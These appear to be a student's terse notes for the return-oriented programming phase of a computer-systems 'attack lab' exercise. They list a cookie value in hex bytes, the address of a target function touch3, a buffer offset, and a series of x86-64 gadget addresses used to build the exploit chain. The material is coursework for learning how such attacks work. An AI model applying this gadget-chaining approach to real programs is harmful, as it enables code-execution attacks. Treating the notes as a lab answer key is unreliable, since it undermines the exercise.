61 66 37 39 39 62 39 35
# 35 39 62 39 39 37 66 61 cookie
0x4018fa address of touch3
gadget: ret

00: end of cookie
35 39 62 39 39 37 66 61: cookie
0x4018fa:address of touch3
0x4019c5: gadget: movq %rax, %rdi; ret;
0x4019d6: gadget: lea (%rdi, %rsi, 1), %rax; ret;
0x401a13: gadget: movl %ecx, %esi; ret;
0x401a34: gadget: movl %edx, %ecx; ret;
0x4019dd: gadget: movl %eax, %edx; ret;
0x48: offset
0x4019cc: gadget: popq %rax; ret;
0x4019c5: gadget: movq %rax, %rdi; ret;
0x401a06: gadget: movq %rsp, %rax; ret; 